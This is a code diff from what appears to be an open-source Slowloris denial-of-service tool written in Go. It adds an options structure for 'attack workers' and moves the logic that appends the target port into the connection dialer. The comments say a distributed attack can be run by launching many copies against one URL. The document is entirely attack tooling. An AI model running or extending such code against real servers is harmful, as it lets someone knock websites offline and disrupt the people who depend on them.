@@ -5,32 +5,29 @@ import (
 	"crypto/tls"
 	"fmt"
 	"net"
+	"net/url"
 	"strings"
 	"time"
 
 	"github.com/icrowley/fake"
 )
 
+// Options holds configuration for slowloris attack workers
+type Options struct {
+	URL       *url.URL
+	UserAgent string
+	Secure    bool
+	Count     int64
+	Interval  time.Duration
+	Timeout   time.Duration
+}
+
 // Slowloris performs single threaded slow loris attack. If you want to run distributed
 // attack, just run multiple calls of the function over the same URL.
 func Slowloris(ctx context.Context, index int64, options Options) error {
 	// append port if not presented in the host
 	url := options.URL
-	host := url.Host
-	secure := false
-	if url.Scheme == "https" {
-		secure = true
-	}
-
-	if !strings.Contains(host, ":") {
-		if secure {
-			host = fmt.Sprintf("%s:%s", url.Host, "443")
-		} else {
-			host = fmt.Sprintf("%s:%s", url.Host, "80")
-		}
-	}
-
-	conn, err := Dialer(host, secure)
+	conn, err := Dialer(url, options.Secure)
 	if err != nil {
 		fmt.Println(err)
 		return nil
@@ -79,8 +76,16 @@ func Slowloris(ctx context.Context, index int64, options Options) error {
 
 // Dialer creates either non-secure or TLS secured TCP connection to send data
 // to target server
-func Dialer(host string, secure bool) (net.Conn, error) {
+func Dialer(url *url.URL, secure bool) (net.Conn, error) {
 	proto := "tcp"
+	host := url.Host
+	if !strings.Contains(host, ":") {
+		if secure {
+			host = fmt.Sprintf("%s:%s", url.Host, "443")
+		} else {
+			host = fmt.Sprintf("%s:%s", url.Host, "80")
+		}
+	}
 
 	// create tls tcp connection
 	if secure {
